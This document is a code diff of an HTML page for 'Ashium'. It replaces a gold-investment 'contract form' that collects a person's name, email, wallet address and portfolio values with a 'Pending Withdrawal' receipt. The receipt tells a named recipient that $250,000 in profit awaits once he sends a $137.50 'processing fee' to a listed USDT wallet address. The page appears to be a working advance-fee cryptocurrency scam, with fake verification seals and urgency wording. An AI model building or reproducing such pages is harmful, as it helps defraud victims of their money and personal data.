@@ -1,68 +1,400 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"></head>
-<body style="font-family:Arial,sans-serif;margin:40px;background:#f8f9fa;">
-<div style="max-width:800px;margin:auto;background:white;padding:40px;border-radius:12px;box-shadow:0 8px 32px rgba(212,175,55,0.2);border:2px solid #D4AF37;">
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ashium – Pending Withdrawal</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
-<h1 style="text-align:center;color:#D4AF37;font-size:28px;margin-bottom:10px;">🏆 <b>ASHIUM</b> GOLD INVESTMENT</h1>
-<h2 style="text-align:center;color:#333;font-size:20px;margin-bottom:30px;border-bottom:3px solid #D4AF37;padding-bottom:15px;">OFFICIAL CONTRACT FORM</h2>
+    body {
+      background: #e8e8ec;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
 
-<p><b>Contract Ref#:</b> <span id="refnum" style="background:#e8f4fd;padding:8px;border-radius:6px;font-family:monospace;">2026#25%PAYOUT$$EXPIRES IN 7DAYS</span> | <b>Date:</b> <span id="today">}JAN 2026</span></p>
+    .card {
+      background: #f4f4f6;
+      border-radius: 28px;
+      width: 100%;
+      max-width: 390px;
+      padding: 36px 28px 32px;
+      box-shadow: 0 4px 40px rgba(0,0,0,0.10);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0;
+    }
 
-<hr style="border:2px solid #D4AF37;">
+    /* Avatar */
+    .avatar {
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      border: 2px solid #ccc;
+      background: #1a2b3c;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      margin-bottom: 14px;
+      position: relative;
+    }
 
-<h3>👤 INVESTOR INFORMATION</h3>
-<table style="width:100%;border-collapse:collapse;">
-<tr><td style="width:50%;padding:12px;"><b>Full Name:</b></td><td><input type="text" id="fullname" style="width:100%;padding:10px;border:2px solid #ddd;border-radius:6px;font-size:14px;"placeholder="Enter full legal name"></td></tr>
-<tr><td><b>Username:</b></td><td><input type="text" id="username" style="width:100%;padding:10px;border:2px solid #ddd;border-radius:6px;font-size:14px; "placeholder="Enter username"></td></tr>
-<tr><td><b>Email:</b></td><td><input type="email" id="email" style="width:100%;padding:10px;border:2px solid #ddd;border-radius:6px;font-size:14px;"placeholder="Enter Email Address"></td></tr>
-</table>
+    .avatar-label {
+      color: #a0b4c4;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+    }
 
-<h3>💰 CRYPTOCURRENCY DETAILS</h3>
-<table style="width:100%;border-collapse:collapse;">
-<tr><td style="width:30%;padding:12px;"><b>Withdrawal Wallet Address:</b></td><td><textarea id="wallet" rows="3" style="width:100%;padding:10px;border:2px solid #ddd;border-radius:6px;font-family:monospace;font-size:12px;"placeholder="0x... or bc1... (Full address)"></textarea></td></tr>
-<tr><td><b>HashID:</b></td><td><input type="text" id="hashid" style="width:100%;padding:10px;border:2px solid #ddd;border-radius:6px;font-family:monospace;"placeholder="#ASH ID" </td></tr>
-<tr><td><b>Last Reinvestment Capital:</b></td><td><input type="number" id="reinvest" style="width:100%;padding:10px;border:2px solid #ddd;border-radius:6px;"placeholder="$5000.00">$$</td></tr>
-<tr><td><b>Portfolio Value in Capital:</b></td><td><input type="number" id="portfolio" style="width:100%;padding:10px;border:2px solid #ddd;border-radius:6px;"placeholder="$25000.00">$$</td></tr>
-<tr><td><b>Reinvestment HashID:</b></td><td><input type="text" id="reinvhash" style="width:100%;padding:10px;border:2px solid #ddd;border-radius:6px;font-family:monospace;"placeholder="#ASH ID"</td></tr>
-</table>
+    .avatar-dot {
+      position: absolute;
+      bottom: 6px;
+      right: 6px;
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      background: #fff;
+      border: 2px solid #ddd;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-<h3>📋 TERMS AGREEMENT <small>(Check All)</small></h3>
-<div style="background:#f0f8f0;padding:20px;border-radius:8px;border-left:5px solid #28a745;">
-<label><input type="checkbox" id="term1"> 1. Verify wallet/hash accuracy</label><br>
-<label><input type="checkbox" id="term2"> 2. Authorize Ashium management</label><br>
-<label><input type="checkbox" id="term3"> 3. Accept crypto/gold risks</label><br>
-<label><input type="checkbox" id="term4"> 4. Agree withdrawal policies</label><br>
-<label><input type="checkbox" id="term5"> 5. Consent blockchain verification</label>
-</div>
+    .avatar-dot svg {
+      width: 7px;
+      height: 7px;
+    }
 
-<h3>✍️ DIGITAL SIGNATURE</h3>
-<p style="font-size:18px;border-top:3px solid #D4AF37;padding-top:20px;">
-"I certify all information is <b>TRUE & ACCURATE</b>. I own specified wallets."
-</p>
-<div style="display:flex;align-items:center;gap:20px;">
-<input type="text" id="signature" style="flex:1;padding:15px;border:2px solid #D4AF37;border-radius:8px;font-size:16px;font-family:'Courier New';" placeholder="Type FULL NAME to sign">
-<button onclick="generatePDF()" style="background:#D4AF37;color:white;padding:15px 25px;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">📄 GENERATE PDF</button>
-</div>
+    /* Brand */
+    .brand {
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 2.5px;
+      color: #5a5a6a;
+      text-transform: uppercase;
+      margin-bottom: 10px;
+    }
 
-<div style="margin-top:40px;padding:20px;background:#e8f4fd;border-radius:8px;text-align:center;">
-<b>✅ ASHIUM VERIFICATION PENDING</b><br>
-Status: <span style="background:#ffc107;padding:5px;border-radius:4px;">PENDING</span> | Seal: 🔒 Blockchain Verified
-</div>
+    /* Heading */
+    .heading {
+      font-size: 30px;
+      font-weight: 900;
+      color: #111;
+      text-align: center;
+      line-height: 1.15;
+      margin-bottom: 14px;
+      letter-spacing: -0.5px;
+    }
 
-</div>
+    /* Subtext */
+    .subtext {
+      font-size: 14px;
+      font-weight: 600;
+      color: #333;
+      text-align: center;
+      margin-bottom: 6px;
+      line-height: 1.5;
+    }
 
-<script>
-function generatePDF() {
-  if(!document.getElementById('signature').value) {
-    alert('⚠️ Please type your FULL NAME to digitally sign');
-    return;
-  }
-  // Mobile-ready PDF generation
-  window.print();
-  alert('✅ PDF Generated! Print/Save for records.');
-}
-</script>
+    .subtext-light {
+      font-size: 14px;
+      color: #555;
+      text-align: center;
+      margin-bottom: 24px;
+      line-height: 1.55;
+    }
+
+    /* Toggle tabs */
+    .tab-bar {
+      background: #eaeaee;
+      border-radius: 50px;
+      display: flex;
+      width: 100%;
+      padding: 4px;
+      margin-bottom: 24px;
+    }
+
+    .tab {
+      flex: 1;
+      text-align: center;
+      padding: 12px 0;
+      font-size: 15px;
+      font-weight: 600;
+      border-radius: 50px;
+      cursor: pointer;
+      color: #888;
+      transition: background 0.2s, color 0.2s;
+    }
+
+    .tab.active {
+      background: #111;
+      color: #fff;
+    }
+
+    /* Details rows */
+    .details {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+      margin-bottom: 20px;
+    }
+
+    .detail-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 14px 0;
+      border-bottom: 1px solid #dcdce0;
+    }
+
+    .detail-row:last-child {
+      border-bottom: none;
+    }
+
+    .detail-label {
+      font-size: 14px;
+      color: #888;
+      font-weight: 400;
+    }
+
+    .detail-value {
+      font-size: 15px;
+      font-weight: 700;
+      color: #111;
+    }
+
+    .detail-value.fee {
+      color: #e05a5a;
+    }
+
+    /* Deposit box */
+    .deposit-box {
+      width: 100%;
+      background: #fff;
+      border-radius: 14px;
+      padding: 16px;
+      margin-bottom: 16px;
+    }
+
+    .deposit-label {
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      color: #aaa;
+      text-transform: uppercase;
+      margin-bottom: 10px;
+    }
+
+    .deposit-address-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: #f4f4f6;
+      border-radius: 10px;
+      padding: 10px 12px;
+    }
+
+    .deposit-address {
+      flex: 1;
+      font-size: 13px;
+      color: #333;
+      word-break: break-all;
+      line-height: 1.4;
+      font-family: "SF Mono", "Fira Code", monospace;
+    }
+
+    .copy-btn {
+      flex-shrink: 0;
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #eaeaee;
+      border-radius: 8px;
+      cursor: pointer;
+      border: none;
+    }
+
+    .copy-btn svg {
+      width: 16px;
+      height: 16px;
+      color: #666;
+    }
+
+    /* Live chat button */
+    .live-chat-btn {
+      width: 100%;
+      padding: 16px;
+      border-radius: 14px;
+      border: 1.5px solid #dcdce0;
+      background: #fff;
+      font-size: 15px;
+      font-weight: 600;
+      color: #111;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 20px;
+      transition: background 0.15s;
+    }
+
+    .live-chat-btn:hover {
+      background: #f0f0f4;
+    }
+
+    .live-chat-btn svg {
+      width: 18px;
+      height: 18px;
+    }
+
+    /* Footer */
+    .footer {
+      font-size: 12px;
+      color: #aaa;
+      text-align: center;
+    }
+
+    /* Floating chat bubble */
+    .chat-bubble {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      width: 52px;
+      height: 52px;
+      background: #111;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.25);
+    }
+
+    .chat-bubble svg {
+      width: 22px;
+      height: 22px;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+
+    <!-- Avatar -->
+    <div class="avatar">
+      <span class="avatar-label">Ashium</span>
+      <div class="avatar-dot">
+        <svg viewBox="0 0 10 10" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M3 5l2 2 3-3" stroke="#555" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+    </div>
+
+    <!-- Brand -->
+    <p class="brand">Ashium.com</p>
+
+    <!-- Heading -->
+    <h1 class="heading">Pending Withdrawal<br>Transaction</h1>
+
+    <!-- Subtext -->
+    <p class="subtext">Your pending withdrawal transaction is due for payout.</p>
+    <p class="subtext-light">Please complete the pending Fractional deposit as soon as possible to ensure your transaction is proceed.</p>
+
+    <!-- Tabs -->
+    <div class="tab-bar">
+      <div class="tab">Status</div>
+      <div class="tab active">Details</div>
+    </div>
+
+    <!-- Details -->
+    <div class="details">
+      <div class="detail-row">
+        <span class="detail-label">Recipient</span>
+        <span class="detail-value">Ian Gowland</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">Profit Amount</span>
+        <span class="detail-value">$ 250000</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">Processing Fee</span>
+        <span class="detail-value fee">$ 137.50</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-label">Issuer</span>
+        <span class="detail-value">Ashium.com</span>
+      </div>
+    </div>
+
+    <!-- Deposit Box -->
+    <div class="deposit-box">
+      <p class="deposit-label">Deposit USDT ERC20</p>
+      <div class="deposit-address-row">
+        <span class="deposit-address">0x5DcB965131d92982eFa6C674eF209434c7945d3d</span>
+        <button class="copy-btn" title="Copy address">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <!-- Live Chat -->
+    <button class="live-chat-btn">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+      </svg>
+      Live chat
+    </button>
+
+    <!-- Footer -->
+    <p class="footer">Ashium.com Receipt · Secure &amp; Verified</p>
+
+  </div>
+
+  <!-- Floating chat bubble -->
+  <div class="chat-bubble">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+    </svg>
+  </div>
+
+  <script>
+    // Tab toggle
+    const tabs = document.querySelectorAll('.tab');
+    tabs.forEach(tab => {
+      tab.addEventListener('click', () => {
+        tabs.forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
+      });
+    });
+
+    // Copy address
+    const copyBtn = document.querySelector('.copy-btn');
+    const address = document.querySelector('.deposit-address');
+    copyBtn.addEventListener('click', () => {
+      navigator.clipboard.writeText(address.textContent.trim()).then(() => {
+        copyBtn.title = 'Copied!';
+        setTimeout(() => copyBtn.title = 'Copy address', 2000);
+      });
+    });
+  </script>
 
 </body>
 </html>
